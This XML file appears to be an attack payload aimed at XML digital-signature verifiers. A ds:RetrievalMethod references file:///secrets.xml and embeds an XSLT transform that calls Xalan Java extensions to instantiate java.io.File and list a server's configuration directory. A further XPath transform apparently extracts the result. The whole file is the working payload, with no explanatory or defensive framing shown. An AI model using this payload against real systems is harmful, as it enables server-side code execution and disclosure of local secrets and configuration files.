<?xml version="1.0" encoding="UTF-8"?>
<ds:RetrievalMethod xmlns:ds="http://www.w3.org/2000/09/xmldsig#"
                    URI="file:///secrets.xml"
                    Type="http://www.w3.org/2000/09/xmldsig#rawX509Certificate">
  <ds:Transforms>
    <ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
      <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                      xmlns:fl="http://xml.apache.org/xalan/java/java.io.File"
                      xmlns:arr="http://xml.apache.org/xalan/java/java.util.Arrays"
                      version="1.0">
        <xsl:output method="xml" omit-xml-declaration="yes"/>
        <xsl:template match="/">
          <data><xsl:value-of select="arr:toString(fl:list(fl:new('/opt/out/instance/server/default/conf/')))"/></data>
        </xsl:template>
      </xsl:stylesheet>
    </ds:Transform>
    <ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xpath-19991116">
      <ds:XPath>function-available(substring('ds:',1,3*number(self::text() and name(parent::node())='data')))</ds:XPath>
    </ds:Transform>
  </ds:Transforms>
</ds:RetrievalMethod>
